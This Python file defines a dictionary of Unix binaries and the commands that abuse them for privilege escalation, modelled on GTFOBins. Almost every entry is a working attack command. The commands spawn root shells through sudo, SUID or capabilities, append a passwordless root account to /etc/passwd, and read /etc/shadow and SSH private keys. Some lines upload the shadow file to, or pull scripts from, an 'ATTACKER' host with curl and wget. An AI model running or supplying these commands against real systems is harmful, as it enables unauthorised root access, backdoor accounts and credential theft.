"""Curated GTFOBins seed — Unix binaries abusable for privilege escalation.

One entry per binary. `functions` keys follow GTFOBins terminology:
  sudo         - run via a misconfigured `sudo <binary>` to get a root shell
  suid         - the binary has the SUID bit; spawn a shell keeping euid
  capabilities - has a Linux capability (e.g. cap_setuid+ep) to abuse
  shell        - break out to a shell from an interactive/restricted context
  file-read    - read a file as the elevated user
  file-write   - write a file as the elevated user
  file-download / file-upload - transfer files (exfil / staging)

Commands assume `/bin/sh`; for SUID escalation prefer the `-p` variant that
preserves the effective uid. This is a high-value subset, not the full corpus.
Full data + more functions: https://gtfobins.github.io
"""

from __future__ import annotations

GTFOBINS: dict[str, dict[str, list[str]]] = {
    "bash": {
        "sudo": ["sudo bash"],
        "suid": ["./bash -p"],
    },
    "sh": {
        "sudo": ["sudo sh"],
        "suid": ["./sh -p"],
    },
    "find": {
        "sudo": ["sudo find . -exec /bin/sh \\; -quit"],
        "suid": ["./find . -exec /bin/sh -p \\; -quit"],
        "capabilities": ["./find . -exec /bin/sh -p \\; -quit"],
    },
    "vim": {
        "sudo": ["sudo vim -c ':!/bin/sh'", "sudo vim -c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"],
        "suid": ["./vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"],
        "shell": [":!/bin/sh", ":set shell=/bin/sh|:shell"],
        "capabilities": ["./vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"],
    },
    "nano": {
        "sudo": ["sudo nano", "^R^X then: reset; sh 1>&0 2>&0"],
        "file-write": ["sudo nano /etc/passwd"],
    },
    "less": {
        "sudo": ["sudo less /etc/profile", "then: !/bin/sh"],
        "shell": ["!/bin/sh"],
        "file-read": ["sudo less /etc/shadow"],
    },
    "more": {
        "sudo": ["TERM= sudo more /etc/profile", "then: !/bin/sh"],
        "shell": ["!/bin/sh"],
    },
    "man": {
        "sudo": ["sudo man man", "then: !/bin/sh"],
        "shell": ["!/bin/sh"],
    },
    "awk": {
        "sudo": ["sudo awk 'BEGIN {system(\"/bin/sh\")}'"],
        "suid": ["./awk 'BEGIN {system(\"/bin/sh -p\")}'"],
        "file-read": ["awk '//' /etc/shadow"],
    },
    "gawk": {
        "sudo": ["sudo gawk 'BEGIN {system(\"/bin/sh\")}'"],
    },
    "sed": {
        "sudo": ["sudo sed -n '1e exec sh 1>&0' /etc/hosts"],
        "suid": ["./sed -n '1e exec sh -p 1>&0' /etc/hosts"],
        "file-read": ["sudo sed '' /etc/shadow"],
    },
    "python": {
        "sudo": ["sudo python -c 'import os; os.system(\"/bin/sh\")'"],
        "suid": ["./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"],
        "capabilities": ["./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"],
    },
    "python3": {
        "sudo": ["sudo python3 -c 'import os; os.system(\"/bin/sh\")'"],
        "suid": ["./python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"],
        "capabilities": ["./python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"],
    },
    "perl": {
        "sudo": ["sudo perl -e 'exec \"/bin/sh\";'"],
        "suid": ["./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh -p\";'"],
        "capabilities": ["./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"],
    },
    "ruby": {
        "sudo": ["sudo ruby -e 'exec \"/bin/sh\"'"],
        "suid": ["./ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh -p\"'"],
    },
    "php": {
        "sudo": ["sudo php -r 'system(\"/bin/sh\");'"],
        "suid": ["./php -r 'pcntl_exec(\"/bin/sh\", [\"-p\"]);'"],
    },
    "node": {
        "sudo": ["sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0,1,2]})'"],
        "suid": ["./node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio:[0,1,2]})'"],
    },
    "lua": {
        "sudo": ["sudo lua -e 'os.execute(\"/bin/sh\")'"],
        "suid": ["./lua -e 'local s=require(\"posix\") s.setpid(\"u\",0) os.execute(\"/bin/sh -p\")'"],
    },
    "tar": {
        "sudo": ["sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"],
        "suid": ["./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"],
    },
    "cp": {
        "sudo": ["sudo cp /bin/sh /tmp/sh; # or overwrite a root-run script"],
        "file-write": ["sudo cp attacker_file /etc/cron.d/x"],
    },
    "tee": {
        "sudo": ["echo 'attacker::0:0::/root:/bin/sh' | sudo tee -a /etc/passwd"],
        "file-write": ["echo data | sudo tee /path/as/root"],
    },
    "dd": {
        "sudo": ["echo 'attacker::0:0::/root:/bin/sh' | sudo dd of=/etc/passwd oflag=append conv=notrunc"],
        "file-write": ["sudo dd if=payload of=/target"],
        "file-read": ["sudo dd if=/etc/shadow"],
    },
    "env": {
        "sudo": ["sudo env /bin/sh"],
        "suid": ["./env /bin/sh -p"],
    },
    "nmap": {
        "sudo": ["sudo nmap --interactive", "then: !sh   (old nmap <5.20)", "sudo nmap --script <(echo 'os.execute(\"/bin/sh\")')"],
        "suid": ["./nmap --interactive", "TF=$(mktemp); echo 'os.execute(\"/bin/sh\")' > $TF; ./nmap --script=$TF"],
    },
    "gdb": {
        "sudo": ["sudo gdb -nx -ex '!sh' -ex quit"],
        "suid": ["./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh -p' -ex quit"],
        "capabilities": ["./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit"],
    },
    "socat": {
        "sudo": ["sudo socat stdin exec:/bin/sh"],
        "file-download": ["socat -u TCP-LISTEN:9999,reuseaddr OPEN:out,creat  # on victim"],
    },
    "wget": {
        "sudo": ["sudo wget --use-askpass=/bin/sh 0"],
        "file-download": ["wget http://ATTACKER/linpeas.sh -O /tmp/l.sh"],
        "file-upload": ["wget --post-file=/etc/shadow http://ATTACKER/"],
    },
    "curl": {
        "file-download": ["curl http://ATTACKER/linpeas.sh -o /tmp/l.sh"],
        "file-upload": ["curl -F 'f=@/etc/shadow' http://ATTACKER/"],
        "file-read": ["curl file:///etc/shadow"],
    },
    "ftp": {
        "sudo": ["sudo ftp", "then: !/bin/sh"],
        "shell": ["!/bin/sh"],
    },
    "docker": {
        "shell": ["docker run -v /:/mnt --rm -it alpine chroot /mnt sh"],
        "note": ["Membership in the `docker` group is effectively root — mount host / and chroot."],
    },
    "git": {
        "sudo": ["sudo git -p help config", "then: !/bin/sh", "sudo git branch --help config; then !/bin/sh"],
        "shell": ["PAGER='sh -c \"exec sh 0<&1\"' git -p help"],
    },
    "make": {
        "sudo": ["COMMAND='/bin/sh'; sudo make -s --eval=$'x:\\n\\t-'\"$COMMAND\""],
        "suid": ["COMMAND='/bin/sh -p'; ./make -s --eval=$'x:\\n\\t-'\"$COMMAND\""],
    },
    "zip": {
        "sudo": ["TF=$(mktemp -u); sudo zip $TF /etc/hosts -T -TT 'sh #'"],
    },
    "ed": {
        "sudo": ["sudo ed", "then: !/bin/sh"],
        "shell": ["!/bin/sh"],
    },
    "tcpdump": {
        "sudo": ["COMMAND='id'; TF=$(mktemp); echo \"$COMMAND\" > $TF; chmod +x $TF; sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root"],
    },
    "ssh": {
        "sudo": ["sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"],
    },
    "cat": {
        "file-read": ["sudo cat /etc/shadow", "sudo cat /root/.ssh/id_rsa"],
    },
}
